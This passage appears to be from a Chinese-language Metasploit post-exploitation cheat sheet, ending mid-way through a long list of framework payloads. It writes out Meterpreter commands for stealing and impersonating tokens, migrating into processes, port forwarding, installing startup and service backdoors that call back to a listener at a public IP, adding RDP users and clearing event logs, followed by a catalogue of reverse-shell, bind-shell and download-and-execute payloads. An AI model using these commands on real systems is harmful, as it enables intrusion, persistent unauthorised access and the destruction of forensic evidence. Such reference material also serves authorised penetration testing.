<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute		#执行cmd -d 在目标主机执行时显示的进程名称（用以伪装） -m 直接从内存中执行</span><br><span class="line">execute -cH -f     #c是将命令丢到通道中</span><br><span class="line">channel -r 4  #查看通道的执行结果</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">execute -cH -f 	#命令</span><br><span class="line">list_tokens -g  </span><br><span class="line">impersonate_token &#39;NT AUTHORITY\NTLM Authentication&#39;	 使用令牌</span><br><span class="line">steal_token pid 偷令牌</span><br><span class="line"></span><br><span class="line">migrate pid 注入进程\进程转移</span><br></pre></td></tr></table></figure>
<h3 id="路由及转发"><a href="#路由及转发" class="headerlink" title="路由及转发"></a>路由及转发</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取本地网络</span><br><span class="line">run get_local_subnets</span><br><span class="line">添加路由</span><br><span class="line">run autoroute -s 10.10.87.0&#x2F;27</span><br><span class="line">端口转发，指将本机(被控机)的端口转发到远程IP(msf服务端)的端口</span><br><span class="line">portfwd add -l 3389 -r 192.168.206.200 -p 3389</span><br></pre></td></tr></table></figure>
<h3 id="权限维持相关"><a href="#权限维持相关" class="headerlink" title="权限维持相关"></a>权限维持相关</h3><h4 id="persistence启动项后门"><a href="#persistence启动项后门" class="headerlink" title="persistence启动项后门"></a>persistence启动项后门</h4><p>这个后门太低级了，可以自行写入免杀的马到注册表中。当然要先上传马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run persistence -X -i 10 -p 6666 -r 103.45.188.176</span><br><span class="line"></span><br><span class="line">-X 系统开机自启</span><br><span class="line">-i 10 10秒重连一次</span><br><span class="line">-p 监听端口</span><br><span class="line">-r 监听机移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。</span><br><span class="line"></span><br><span class="line">reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor -d c:\\users\\xxx\\AppData\\local\\backdoor.exe</span><br></pre></td></tr></table></figure>
<h4 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h4><p>这个也不行，权限维持还是用其他方法来做比较好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure>
<h4 id="开启RDP"><a href="#开启RDP" class="headerlink" title="开启RDP"></a>开启RDP</h4><h5 id="getgui"><a href="#getgui" class="headerlink" title="getgui"></a>getgui</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run getgui –h #查看帮助</span><br><span class="line">run getgui -e #开启远程桌面</span><br><span class="line">run getgui -u lltest2 -p 123456   #添加用户</span><br><span class="line">run getgui -f 6661 -e   #3389端口转发到6661</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
<h5 id="enable-rdp脚本"><a href="#enable-rdp脚本" class="headerlink" title="enable_rdp脚本"></a>enable_rdp脚本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;admin PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br><span class="line">脚本位于&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;manage&#x2F;enable_rdp.rb</span><br><span class="line">通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br></pre></td></tr></table></figure>
<h3 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">clearev 清除事件日志</span><br></pre></td></tr></table></figure>
<h2 id="Payload参考"><a href="#Payload参考" class="headerlink" title="Payload参考"></a>Payload参考</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Framework Payloads (592 total) [--payload &lt;value&gt;]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Name                                                Description</span><br><span class="line">    ----                                                -----------</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_interact                              Simply execve &#x2F;bin&#x2F;sh (for inetd programs)</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    android&#x2F;meterpreter&#x2F;reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP</span><br><span class="line">    android&#x2F;meterpreter&#x2F;reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS</span><br><span class="line">    android&#x2F;meterpreter&#x2F;reverse_tcp                     Run a meterpreter server in Android. Connect back stager</span><br><span class="line">    android&#x2F;meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell</span><br><span class="line">    android&#x2F;meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell</span><br><span class="line">    android&#x2F;meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    android&#x2F;shell&#x2F;reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP</span><br><span class="line">    android&#x2F;shell&#x2F;reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS</span><br><span class="line">    android&#x2F;shell&#x2F;reverse_tcp                           Spawn a piped command shell (sh). Connect back stager</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;meterpreter_reverse_http          Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;meterpreter_reverse_https         Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;meterpreter_reverse_tcp           Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;shell_reverse_tcp                 Connect back to attacker and spawn a command shell</span><br><span class="line">    apple_ios&#x2F;armle&#x2F;meterpreter_reverse_http            Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;armle&#x2F;meterpreter_reverse_https           Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;armle&#x2F;meterpreter_reverse_tcp             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    bsd&#x2F;sparc&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    bsd&#x2F;sparc&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;vax&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x64&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_bind_tcp                              Bind an arbitrary command to an arbitrary port</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_bind_tcp_small                        Listen for a connection and spawn a command shell</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x86&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    bsd&#x2F;x86&#x2F;metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    bsd&#x2F;x86&#x2F;metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;bind_tcp                              Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;find_tag                              Spawn a command shell (staged). Use an established connection</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_find_tag                              Spawn a shell on an established connection (proxy&#x2F;nat safe)</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell&#x2F;bind_tcp                             Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell&#x2F;reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell_bind_tcp                             Listen for a connection and spawn a command shell</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell_find_port                            Spawn a shell on an established connection</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell_reverse_tcp                          Connect back to attacker and spawn a command shell</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;apf_privesc_jcl                       (Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecure</span><br><span class="line">                                                        d&#x2F;updateable APF authorized library (APFLIB) and updating the user&#39;s ACEE using this program&#x2F;library. Note: This pr</span><br><span class="line">                                                        ivesc only works with z&#x2F;OS systems using RACF, no other ESM is supported.)</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;bind_shell_jcl                        Provide JCL which creates a bind shell This implmentation does not include ebcdic character translation, so a clien</span><br><span class="line">                                                        t with translation capabilities is required. MSF handles this automatically.</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z&#x2F;OS which will exit and return 0. This can be used as a t</span><br><span class="line">                                                        emplate for other JCL based payloads</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;reverse_shell_jcl                     Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation, so a c</span><br><span class="line">                                                        lient with translation capabilities is required. MSF handles this automatically.</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_busybox_telnetd                       Listen for a connection and spawn a command shell via BusyBox telnetd</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_inetd                                 Listen for a connection and spawn a command shell (persistent)</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_jjs                                   Listen for a connection and spawn a command shell via jjs</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_lua                                   Listen for a connection and spawn a command shell via Lua</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_netcat                                Listen for a connection and spawn a command shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_perl                                  Listen for a connection and spawn a command shell via perl</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_r                                     Continually listen for a connection and spawn a command shell via R</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_socat_udp                             Creates an interactive shell via socat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_stub                                  Listen for a connection and spawn a command shell (stub only, no payload)</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware i</span><br><span class="line">                                                        t isn&#39;t usually installed by default.</span><br><span class="line">    cmd&#x2F;unix&#x2F;generic                                    Executes the supplied command</span><br><span class="line">    cmd&#x2F;unix&#x2F;interact                                   Interacts with a shell on an established socket connection</span><br><span class="line">    cmd&#x2F;unix&#x2F;pingback_bind                              Accept a connection, send a UUID, then exit</span><br><span class="line">    cmd&#x2F;unix&#x2F;pingback_reverse                           Creates a socket, send a UUID, then exit</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_bash                               Creates an interactive shell via bash&#39;s builtin &#x2F;dev&#x2F;tcp. This will not work on circa 2009 and older Debian-based L</span><br><span class="line">                                                        inux distributions (including Ubuntu) because they compile bash without the &#x2F;dev&#x2F;tcp feature.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without</span><br><span class="line">                                                        &#x2F;dev&#x2F;tcp support. This module uses the &#39;-z&#39; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_bash_udp                           Creates an interactive shell via bash&#39;s builtin &#x2F;dev&#x2F;udp. This will not work on circa 2009 and older Debian-based L</span><br><span class="line">                                                        inux distributions (including Ubuntu) because they compile bash without the &#x2F;dev&#x2F;udp feature.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_jjs                                Connect back and create a command shell via jjs</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#39;t us</span><br><span class="line">                                                        ually installed by default.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ssh                                Connect back and create a command shell via SSH</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_tclsh                              Creates an interactive shell via Tclsh</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#39;t us</span><br><span class="line">                                                        ually installed by default.</span><br><span class="line">    cmd&#x2F;windows&#x2F;adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common co</span><br><span class="line">                                                        mplexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Com</span><br><span class="line">                                                        plexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit&#x2F;special)</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_lua                                Listen for a connection and spawn a command shell via Lua</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    cmd&#x2F;windows&#x2F;download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a</span><br><span class="line">                                                        short command line.</span><br><span class="line">    cmd&#x2F;windows&#x2F;download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it</span><br><span class="line">    cmd&#x2F;windows&#x2F;generic                                 Executes the supplied command</span><br><span class="line">    cmd&#x2F;windows&#x2F;powershell_bind_tcp                     Interacts with a powershell session on an established socket connection</span><br><span class="line">    cmd&#x2F;windows&#x2F;powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_lua                             Creates an interactive shell via Lua</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_perl                            Creates an interactive shell via perl</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_powershell                      Connect back and create a command shell via Powershell</span><br><span class="line">    cmd&#x2F;windows&#x2F;reverse_ruby                            Connect back and create a command shell via Ruby</span><br><span class="line">    firefox&#x2F;exec                                        This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash th</span><br><span class="line">                                                        e command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript &quot;launcher&quot; to d</span><br><span class="line">                                                        isk that hides the prompt.</span><br><span class="line">    firefox&#x2F;shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox&#39;s XPCOM API</span><br><span class="line">    firefox&#x2F;shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox&#39;s XPCOM API</span><br><span class="line">    generic&#x2F;custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.</span><br><span class="line">    generic&#x2F;debug_trap                                  Generate a debug trap in the target process</span><br><span class="line">    generic&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    generic&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    generic&#x2F;tight_loop                                  Generate a tight loop in the target process</span><br><span class="line">    java&#x2F;jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell</span><br><span class="line">    java&#x2F;jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell</span><br><span class="line">    java&#x2F;meterpreter&#x2F;bind_tcp                           Run a meterpreter server in Java. Listen for a connection</span><br><span class="line">    java&#x2F;meterpreter&#x2F;reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP</span><br><span class="line">    java&#x2F;meterpreter&#x2F;reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS</span><br><span class="line">    java&#x2F;meterpreter&#x2F;reverse_tcp                        Run a meterpreter server in Java. Connect back stager</span><br><span class="line">    java&#x2F;shell&#x2F;bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, &#x2F;bin&#x2F;sh everywhere else). Listen for a connection</span><br><span class="line">    java&#x2F;shell&#x2F;reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, &#x2F;bin&#x2F;sh everywhere else). Connect back stager</span><br><span class="line">    java&#x2F;shell_reverse_tcp                              Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter&#x2F;reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter_reverse_http              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter_reverse_https             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;aarch64&#x2F;meterpreter_reverse_tcp               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;aarch64&#x2F;shell&#x2F;reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker</span><br><span class="line">    linux&#x2F;aarch64&#x2F;shell_reverse_tcp                     Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;armbe&#x2F;meterpreter_reverse_http                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armbe&#x2F;meterpreter_reverse_https               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armbe&#x2F;meterpreter_reverse_tcp                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armbe&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;armle&#x2F;adduser                                 Create a new user with UID 0</span><br><span class="line">    linux&#x2F;armle&#x2F;exec                                    Execute an arbitrary command</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter&#x2F;bind_tcp                    Inject the mettle server payload (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter&#x2F;reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter_reverse_http                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter_reverse_https               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armle&#x2F;meterpreter_reverse_tcp                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;armle&#x2F;shell&#x2F;bind_tcp                          dup2 socket in r12, then execve. Listen for a connection</span><br><span class="line">    linux&#x2F;armle&#x2F;shell&#x2F;reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker</span><br><span class="line">    linux&#x2F;armle&#x2F;shell_bind_tcp                          Connect to target and spawn a command shell</span><br><span class="line">    linux&#x2F;armle&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;mips64&#x2F;meterpreter_reverse_http               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mips64&#x2F;meterpreter_reverse_https              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mips64&#x2F;meterpreter_reverse_tcp                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter&#x2F;reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter_reverse_http               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter_reverse_https              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;meterpreter_reverse_tcp                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executin</span><br><span class="line">                                                        g other payloads that rely on initial startup procedures.</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;shell&#x2F;reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;shell_bind_tcp                         Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;mipsbe&#x2F;shell_reverse_tcp                      Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;mipsle&#x2F;exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on</span><br><span class="line">                                                        targets with extremely limited buffer space.</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter&#x2F;reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter_reverse_http               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter_reverse_https              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsle&#x2F;meterpreter_reverse_tcp                Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;mipsle&#x2F;reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.</span><br><span class="line">    linux&#x2F;mipsle&#x2F;shell&#x2F;reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;mipsle&#x2F;shell_bind_tcp                         Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;mipsle&#x2F;shell_reverse_tcp                      Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc&#x2F;meterpreter_reverse_http                  Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc&#x2F;meterpreter_reverse_https                 Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc&#x2F;meterpreter_reverse_tcp                   Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc&#x2F;shell_find_port                           Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;ppc&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc64&#x2F;shell_bind_tcp                          Listen for a connection and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc64&#x2F;shell_find_port                         Spawn a shell on an established connection</span><br><span class="line">    linux&#x2F;ppc64&#x2F;shell_reverse_tcp                       Connect back to attacker and spawn a command shell</span><br><span class="line">    linux&#x2F;ppc64le&#x2F;meterpreter_reverse_http              Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc64le&#x2F;meterpreter_reverse_https             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppc64le&#x2F;meterpreter_reverse_tcp               Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppce500v2&#x2F;meterpreter_reverse_http            Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppce500v2&#x2F;meterpreter_reverse_https           Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;ppce500v2&#x2F;meterpreter_reverse_tcp             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    linux&#x2F;x64&#x2F;exec                                      Execute an arbitrary command</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                      Inject the mettle server payload (staged). Listen for a connection</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker</span><br><span class="line">    linux&#x2F;x64&#x2F;meterpreter_reverse_http                 